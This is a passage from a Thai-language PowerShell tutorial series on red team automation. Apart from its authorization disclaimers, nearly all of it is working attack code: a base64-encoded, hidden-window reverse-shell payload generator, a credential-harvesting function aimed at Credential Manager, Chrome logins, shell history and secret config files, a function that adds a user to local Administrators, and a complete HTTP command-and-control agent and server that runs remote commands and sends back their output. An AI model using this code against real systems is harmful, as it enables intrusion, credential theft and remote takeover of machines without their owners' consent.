# Part 50: Red Team Automation (Authorized Only)

> **ระดับ**: 🔴 Professional/Security | **เวลา**: ~5 ชั่วขนึ่ง

> ⚠️ **สำหรับ**: Red Team ที่ได้รับอนุญาต, CTF, Security Research Lab **เท่านั้น** - การใช้โดยไม่ได้รับอนุญาตถือเป็นอาญา

---

## 1. Payload Generation (CTF/Lab)

```powershell
# Reverse shell สำหรับ CTF และ authorized engagements
# ใช้เหมือนกับ Netcat listener ฝั่ง attacker

function New-ReverseShellPayload {
    param(
        [Parameter(Mandatory)]
        [string]$LHOST,
        
        [Parameter(Mandatory)]
        [int]$LPORT,
        
        [ValidateSet('TCP','HTTP')]
        [string]$Type = 'TCP'
    )
    
    if ($Type -eq 'TCP') {
        $payload = @"
`$c=New-Object System.Net.Sockets.TcpClient('$LHOST',$LPORT);`
`$s=`$c.GetStream();`
[byte[]]`$b=0..65535|%{0};`
while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`
`$d=([text.encoding]::ASCII).GetString(`$b,0,`$i);`
`$o=(iex `$d 2>&1|Out-String);`
`$r=`$o+'PS '+(pwd)+'>>';`
`$x=([text.encoding]::ASCII).GetBytes(`$r);`
`$s.Write(`$x,0,`$x.Length)}`n
"@
    }
    
    # Base64 encoded version
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    $oneliner = "powershell -NoP -Sta -NonI -W Hidden -Enc $encoded"
    
    [PSCustomObject]@{
        Plain   = $payload
        Encoded = $oneliner
    }
}

# CTF usage: nc -lvnp 4444 (on attacker)
# New-ReverseShellPayload -LHOST 192.168.100.50 -LPORT 4444
```

---

## 2. Post-Exploitation Modules (Authorized)

```powershell
# Credential harvesting จาก common locations (authorized pentest)
function Get-StoredCredentials {
    $creds = @()
    
    # Windows Credential Manager
    $vaultCreds = & cmdkey.exe /list 2>&1 | Select-String 'Target|User'
    if ($vaultCreds) { $creds += $vaultCreds }
    
    # Browser SQLite (Chrome)
    $chromeLogin = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromeLogin) {
        $creds += "[Chrome] Login Data exists: $chromeLogin"
        # เปิด SQLite file requires SQLite library or copy
    }
    
    # PowerShell history
    $psHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $psHistory) {
        $lines = Get-Content $psHistory | Select-String -Pattern 'pass|password|credential|secret|key|token' -CaseSensitive:$false
        if ($lines) { $creds += "[PSHistory] $($lines.Count) sensitive lines found" }
    }
    
    # .env files and config
    Get-ChildItem $env:USERPROFILE, 'C:\inetpub', 'C:\App' -Recurse -ErrorAction SilentlyContinue |
        Where-Object Name -in '.env','appsettings.json','web.config','secrets.yml' |
        ForEach-Object { $creds += "[ConfigFile] $($_.FullName)" }
    
    return $creds
}

Get-StoredCredentials

# Lateral movement setup ใน authorized test
function Enable-LatMovement {
    param([string]$User, [string]$Pass)
    # เปิด WinRM เพื่อใช้ใน authorized test
    Enable-PSRemoting -Force
    & net localgroup Administrators $User /add
    [PSCustomObject]@{ Status='Done'; User=$User }
}
```

---

## 3. C2-like Communication (Lab)

```powershell
# HTTP-based C2 agent สำหรับ lab/CTF
# (ไม่ใช้ไปเชื่อมต่อระบบจริง)

$C2Server = 'http://192.168.100.50:8888'  # lab only

function Invoke-C2CheckIn {
    param([string]$AgentId = (New-Guid).Guid.Substring(0,8))
    
    $sysinfo = @{
        id       = $AgentId
        hostname = $env:COMPUTERNAME
        user     = $env:USERNAME
        os       = (Get-CimInstance Win32_OperatingSystem).Caption
        ts       = (Get-Date).ToString('o')
    }
    
    try {
        $resp = Invoke-RestMethod -Uri "$C2Server/checkin" -Method POST `
            -Body ($sysinfo | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 5
        return $resp  # return task
    } catch {
        return $null
    }
}

function Invoke-C2Task {
    param([string]$AgentId)
    $task = Invoke-C2CheckIn -AgentId $AgentId
    if ($task -and $task.cmd) {
        $output = try { Invoke-Expression $task.cmd 2>&1 | Out-String } catch { "Error: $_" }
        Invoke-RestMethod -Uri "$C2Server/result" -Method POST `
            -Body (@{id=$AgentId; result=$output} | ConvertTo-Json) -ContentType 'application/json'
    }
}

# C2 Server side (abb. for lab)
function Start-C2Server {
    param([int]$Port = 8888)
    $http = [System.Net.HttpListener]::new()
    $http.Prefixes.Add("http://+:$Port/")
    $http.Start()
    $tasks   = @{}
    $results = @()
    
    Write-Host "C2 server on port $Port"
    while ($true) {
        $ctx  = $http.GetContext()
        $req  = $ctx.Request
        $resp = $ctx.Response
        
        if ($req.Url.LocalPath -eq '/checkin') {
            $agent = [System.IO.StreamReader]::new($req.InputStream).ReadToEnd() | ConvertFrom-Json
            Write-Host "CheckIn: $($agent.hostname) / $($agent.user)"
            $task = if ($tasks[$agent.id]) { $tasks[$agent.id]; $tasks.Remove($agent.id) } else { @{} }
            $json = $task | ConvertTo-Json
            $bytes = [Text.Encoding]::UTF8.GetBytes($json)
            $resp.ContentType = 'application/json'
            $resp.OutputStream.Write($bytes, 0, $bytes.Length)
        } elseif ($req.Url.LocalPath -eq '/result') {
            $data = [System.IO.StreamReader]::new($req.InputStream).ReadToEnd() | ConvertFrom-Json
            $results += $data
            Write-Host "Result: $($data.result)"
            $resp.StatusCode = 200
        }
        $resp.Close()
    }
}
```

---

**ก่อนหน้า ← [Part 49](Part-49.md) | ต่อไป → [Part 51: CTF Toolkit](Part-51.md)**
